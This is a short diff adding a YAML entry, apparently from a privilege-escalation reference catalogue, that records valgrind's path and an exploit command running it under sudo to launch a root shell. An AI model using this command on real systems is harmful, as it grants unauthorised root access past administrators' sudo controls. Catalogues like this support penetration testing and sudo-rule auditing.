@@ -1,0 +1,4 @@
+name: valgrind
+binary_path: /usr/bin/valgrind
+exploit_cmds:
+- sudo /usr/bin/valgrind /bin/sh
